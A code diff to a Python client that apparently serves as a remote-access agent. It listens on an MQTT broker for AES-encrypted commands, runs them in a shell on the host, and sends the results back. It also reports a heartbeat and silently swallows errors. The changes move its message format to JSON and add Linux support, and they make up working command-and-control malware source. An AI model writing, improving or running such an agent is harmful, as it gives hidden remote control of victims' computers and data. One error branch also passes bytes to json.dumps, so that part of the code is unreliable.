@@ -6,6 +6,7 @@ import subprocess
 import hashlib
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
+import json
 import locale
 import threading
 import time
@@ -58,15 +59,13 @@ def decrypt(ciphertext:bytes, key=key, iv=iv):
     except:
         return False
 
-def mode_cmd(content, session_id):
+def mode_cmd(job_id, session_id, cmd):
     global client, donejob_list, runpath_dict
 
-    job_id = content.split(b" ")[1].decode()
-
     if not job_id in donejob_list:
-        cmd = b" ".join(content.split(b" ")[2:]).decode()
+        cmd = cmd
         if cmd.lower() == "exit":
-            p = subprocess.Popen(f"taskkill -F -PID {os.getpid()}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            p = subprocess.Popen(f"taskkill -F -PID {os.getpid()}" if os.name == "nt" else f"kill -9 {os.getpid()}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             stdout, stderr = p.communicate()
         elif cmd.startswith("cd "):
             directory = cmd.split("cd ",1)[1]
@@ -106,10 +105,10 @@ def mode_cmd(content, session_id):
             result = stdout.decode(encoding, errors="replace")
         else:
             result = "<stderr>" + stderr.decode(encoding, errors="replace")
-        send(client, topic_list["result"], job_id, result.encode(), qos=2)
+        send(client, topic_list["result"], {"job_id":job_id, "result": result}, qos=2)
         donejob_list.append(job_id)
     else:
-        send(client, topic_list["result"], job_id, b"<stderr>\033[1;31mSame job id not accepted. ", qos=2)
+        send(client, topic_list["result"], {"job_id":job_id, "result":b"<stderr>\033[1;31mSame job id not accepted. "}, qos=2)
 
 def on_connect(client, userdata, flags, rc):
     global connected
@@ -123,24 +122,30 @@ def on_disconnect(client, userdata, rc):
     print("Disconnected with result code: "+str(rc))
 
 def on_message(client, userdata, msg):
-    global client_id, runpath_dict
+    try:
+        global client_id, runpath_dict
 
-    msg.payload = decrypt(msg.payload)
-    if msg.payload:
-        session_id = msg.payload.split(b" ")[0]
-        msg_id = msg.payload.split(b" ")[1]
-        if msg_id.decode() == client_id:
-            content = b" ".join(msg.payload.split(b" ")[2:])
-            if content.split(b" ")[0].decode() == "cmd":
-                if not session_id in list(runpath_dict):
-                    runpath_dict[session_id] = os.path.expanduser("~")
-                run_thread = threading.Thread(target=mode_cmd, args=(content, session_id))
-                run_thread.start()
-            else:
-                print(content)
+        msg.payload = decrypt(msg.payload)
+        if msg.payload:
+            msg_json = json.loads(msg.payload)
+            session_id = msg_json["session_id"]
+            target = msg_json["target"]
+            if target == client_id:
+                mode = msg_json["mode"]
+                if mode == "cmd":
+                    job_id = msg_json["job_id"]
+                    cmd = msg_json["cmd"]
+                    if not session_id in list(runpath_dict):
+                        runpath_dict[session_id] = os.path.expanduser("~")
+                    run_thread = threading.Thread(target=mode_cmd, args=(job_id, session_id, cmd))
+                    run_thread.start()
+                else:
+                    pass
+    except Exception as err:
+        pass
 
-def send(client:mqtt_client.Client, topic, id, content:bytes, qos=0):
-    client.publish(topic, encrypt(id.encode() + b" " + content), qos=qos)
+def send(client:mqtt_client.Client, topic, content:dict, qos=0):
+    return client.publish(topic, encrypt(json.dumps(content).encode()), qos=qos)
 
 client = mqtt_client.Client()
 client.on_connect = on_connect
@@ -150,7 +155,7 @@ client.on_message = on_message
 def upload_stats():
     while True:
         if connected:
-            result, mid = client.publish(topic_list["stats"], encrypt(client_id.encode()))
+            result, mid = send(client, topic_list["stats"], {"client_id":client_id})
             print(result, mid)
         time.sleep(0.5)
 
